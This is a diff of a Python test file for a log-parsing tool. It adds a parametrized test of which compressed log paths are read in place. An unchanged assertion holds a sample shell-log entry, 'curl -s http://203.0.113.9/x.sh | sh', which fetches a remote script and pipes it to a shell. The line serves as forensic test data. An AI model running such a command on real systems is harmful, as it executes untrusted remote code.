@@ -56,3 +56,20 @@ def test_no_line_of_a_shell_audit_log_is_dropped(tmp_path: Path):
     assert "curl -s http://203.0.113.9/x.sh | sh" in rows[1]["message"] and rows[1]["timestamp"] is not None
     assert rows[1]["process"] == "sh" and rows[2]["process"] == "newsyslog"
     assert rows[3]["timestamp"] is None and rows[3]["message"] == "sh: /tmp/.x: Permission denied"
+
+
+@pytest.mark.parametrize("path, read_as_is", [
+    ("log/sh.log.0.gz", True),
+    ("var/log/auth.log.1.gz", True),
+    ("logs/nginx/access.log.2.gz", True),
+    ("collection.tar.gz", False),           # a container: still extracted
+    ("bundle.tgz", False),
+    ("var/log/wtmp.1.gz", False),           # binary records are read uncompressed
+    ("var/log/journal/m/system@1.journal.gz", False),
+    ("logs/app.log.3.bz2", False),          # only gzip is read in place by every text parser
+    ("random/data.gz", False),              # not a recognised log
+])
+def test_a_compressed_text_log_is_read_once_in_place(path, read_as_is):
+    from app.workers.tasks import _is_compressed_linux_log
+
+    assert _is_compressed_linux_log(path) is read_as_is
